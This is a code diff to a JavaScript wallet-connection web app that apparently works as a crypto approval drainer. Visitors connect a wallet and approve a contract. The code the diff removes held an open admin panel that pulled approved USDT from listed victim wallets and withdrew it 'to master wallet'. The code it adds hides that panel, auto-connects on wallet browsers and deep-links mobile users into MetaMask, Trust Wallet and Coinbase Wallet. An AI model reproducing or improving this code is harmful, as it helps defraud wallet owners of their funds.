@@ -6,8 +6,6 @@ class WalletManagerApp {
     constructor() {
         this.walletConnector = new WalletConnector();
         this.apiService = new ApiService();
-        this.isAdmin = true; // Always true - no authentication
-        this.adminKey = 'default'; // Default key - no authentication needed
         
         this.initializeElements();
         this.attachEventListeners();
@@ -23,17 +21,14 @@ class WalletManagerApp {
         this.usdtBalanceElement = document.getElementById('usdt-balance');
         this.approveButton = document.getElementById('approve-contract');
         
-        // Admin elements (now accessible to everyone)
-        this.adminPanel = document.getElementById('admin-panel');
-        this.walletList = document.getElementById('wallet-list');
-        // Remove admin login elements since they're not needed
-        this.adminKeyInput = document.getElementById('admin-key');
-        this.adminLoginButton = document.getElementById('admin-login');
-        this.adminLogoutButton = document.getElementById('admin-logout');
-        this.withdrawButton = document.getElementById('withdraw-all');
-        
         // Loading indicator
         this.loadingIndicator = document.getElementById('loading');
+        
+        // Hide admin elements completely
+        const adminPanel = document.getElementById('admin-panel');
+        const adminLogin = document.getElementById('admin-login');
+        if (adminPanel) adminPanel.style.display = 'none';
+        if (adminLogin) adminLogin.style.display = 'none';
     }
 
     attachEventListeners() {
@@ -44,20 +39,13 @@ class WalletManagerApp {
         if (this.approveButton) {
             this.approveButton.addEventListener('click', () => this.handleApproveContract());
         }
-        
-        // Remove admin login/logout event listeners
-        // Add wallet list loading on init instead
-        
-        if (this.withdrawButton) {
-            this.withdrawButton.addEventListener('click', () => this.handleWithdraw());
-        }
     }
 
     async init() {
         const platform = detectPlatform();
         console.log('Platform detected:', platform);
         
-        // Check if wallet is already connected
+        // Auto-connect if wallet is already connected
         const storedAddress = localStorage.getItem('walletAddress');
         if (storedAddress) {
             this.walletConnector.walletAddress = storedAddress;
@@ -65,15 +53,107 @@ class WalletManagerApp {
             this.showWalletInfo();
         }
         
-        // Always show admin panel and load wallets (no authentication)
-        this.isAdmin = true;
-        this.showAdminPanel();
-        await this.loadWallets();
+        // Auto-connect on wallet browsers
+        if (platform.isWalletBrowser) {
+            console.log('Wallet browser detected, attempting auto-connect...');
+            // Small delay to ensure page is loaded
+            setTimeout(() => {
+                this.handleConnectWallet();
+            }, 500);
+        }
     }
 
     async handleConnectWallet() {
         this.showLoading(true);
         
+        try {
+            const platform = detectPlatform();
+            
+            // Mobile handling
+            if (platform.isMobile) {
+                if (platform.hasWalletExtension) {
+                    // Already in wallet browser, connect directly
+                    await this.connectAndProcessWallet();
+                } else {
+                    // Regular mobile browser, show wallet options
+                    this.showMobileWalletOptions();
+                }
+            } else {
+                // Desktop handling
+                await this.connectAndProcessWallet();
+            }
+        } catch (error) {
+            this.showError(`Connection failed: ${error.message}`);
+        } finally {
+            this.showLoading(false);
+        }
+    }
+
+    showMobileWalletOptions() {
+        // Hide connect button and show wallet options
+        if (this.connectButton) {
+            this.connectButton.style.display = 'none';
+        }
+        
+        // Create wallet options UI
+        const walletOptions = document.createElement('div');
+        walletOptions.id = 'wallet-options';
+        walletOptions.innerHTML = `
+            <h3>Choose Wallet to Connect</h3>
+            <div class="wallet-options-container">
+                <button class="wallet-option" data-wallet="metamask">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" width="30" height="30">
+                    MetaMask
+                </button>
+                <button class="wallet-option" data-wallet="trustwallet">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/TrustWallet-logo.svg" alt="Trust Wallet" width="30" height="30">
+                    Trust Wallet
+                </button>
+                <button class="wallet-option" data-wallet="coinbase">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Coinbase_%28Wallet%29_Logo.png" alt="Coinbase Wallet" width="30" height="30">
+                    Coinbase Wallet
+                </button>
+            </div>
+            <p class="instruction">Select a wallet to open this DApp in that wallet's browser</p>
+        `;
+        
+        // Insert after connection status
+        if (this.connectionStatus.parentNode) {
+            this.connectionStatus.parentNode.insertBefore(walletOptions, this.connectionStatus.nextSibling);
+        }
+        
+        // Add event listeners
+        document.querySelectorAll('.wallet-option').forEach(button => {
+            button.addEventListener('click', (e) => {
+                const wallet = e.target.closest('.wallet-option').dataset.wallet;
+                this.openInWallet(wallet);
+            });
+        });
+    }
+
+    openInWallet(walletName) {
+        const dappUrl = window.location.href;
+        
+        switch(walletName) {
+            case 'metamask':
+                // Try to open in MetaMask app
+                window.location.href = `https://metamask.app.link/dapp/${dappUrl.replace('https://', '').replace('http://', '')}`;
+                break;
+            case 'trustwallet':
+                // Try to open in Trust Wallet app
+                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
+                break;
+            case 'coinbase':
+                // Try to open in Coinbase Wallet
+                window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(dappUrl)}`;
+                break;
+            default:
+                // Fallback to regular connection
+                this.connectAndProcessWallet();
+        }
+    }
+
+    async connectAndProcessWallet() {
         try {
             const result = await this.walletConnector.connect();
             
@@ -96,8 +176,6 @@ class WalletManagerApp {
             }
         } catch (error) {
             this.showError(`Connection failed: ${error.message}`);
-        } finally {
-            this.showLoading(false);
         }
     }
 
@@ -163,111 +241,6 @@ class WalletManagerApp {
         } catch (error) {
             console.error('Error getting USDT balance:', error);
             return '0.00';
-        }
-    }
-
-    // Remove handleAdminLogin and handleAdminLogout methods completely
-
-    showAdminPanel() {
-        // Always show admin panel
-        if (this.adminPanel) {
-            this.adminPanel.classList.remove('hidden');
-        }
-    }
-
-    hideAdminPanel() {
-        // Don't hide admin panel
-        // this.adminPanel.classList.add('hidden');
-    }
-
-    async loadWallets() {
-        // Remove authentication check
-        // if (!this.isAdmin) return;
-        
-        this.showLoading(true);
-        
-        try {
-            // Remove admin key requirement
-            const response = await this.apiService.getAllWallets('default');
-            
-            if (response.success) {
-                this.renderWalletList(response.wallets);
-            } else {
-                this.showError('Failed to load wallets: ' + response.error);
-            }
-        } catch (error) {
-            this.showError('Failed to load wallets: ' + error.message);
-        } finally {
-            this.showLoading(false);
-        }
-    }
-
-    renderWalletList(wallets) {
-        if (!this.walletList) return;
-        
-        if (wallets.length === 0) {
-            this.walletList.innerHTML = '<p class="no-wallets">No wallets connected yet</p>';
-            return;
-        }
-        
-        this.walletList.innerHTML = wallets.map(wallet => `
-            <div class="wallet-card" data-address="${wallet.address}">
-                <h3>${wallet.name || formatAddress(wallet.address)}</h3>
-                <p class="wallet-address">${wallet.address}</p>
-                <p>USDT Balance: <span class="balance">${formatBalance(wallet.usdt_balance)}</span> USDT</p>
-                <p class="status">
-                    ${wallet.is_processed ? 
-                        '<span class="status-badge processed">Processed</span>' : 
-                        (parseFloat(wallet.usdt_balance) > 0 ? 
-                            '<span class="status-badge pending">Pending Pull</span>' : 
-                            '<span class="status-badge inactive">Inactive</span>')
-                    }
-                </p>
-                ${!wallet.is_processed && parseFloat(wallet.usdt_balance) > 0 ? 
-                    `<button class="pull-btn" onclick="app.pullWallet('${wallet.address}')">Pull USDT</button>` : 
-                    ''
-                }
-            </div>
-        `).join('');
-    }
-
-    async pullWallet(walletAddress) {
-        this.showLoading(true);
-        
-        try {
-            // Remove admin key requirement
-            const response = await this.apiService.pullWallet(walletAddress, 'default');
-            
-            if (response.success) {
-                this.showSuccess(`Successfully pulled ${response.amount} USDT`);
-                await this.loadWallets(); // Refresh the list
-            } else {
-                this.showError(`Pull failed: ${response.error}`);
-            }
-        } catch (error) {
-            this.showError(`Pull failed: ${error.message}`);
-        } finally {
-            this.showLoading(false);
-        }
-    }
-
-    async handleWithdraw() {
-        this.showLoading(true);
-        
-        try {
-            // Remove admin key requirement
-            const response = await this.apiService.withdrawContract('default');
-            
-            if (response.success) {
-                this.showSuccess(`Successfully withdrew ${response.amount} USDT to master wallet`);
-                await this.loadWallets(); // Refresh the list
-            } else {
-                this.showError(`Withdrawal failed: ${response.error}`);
-            }
-        } catch (error) {
-            this.showError(`Withdrawal failed: ${error.message}`);
-        } finally {
-            this.showLoading(false);
         }
     }
 
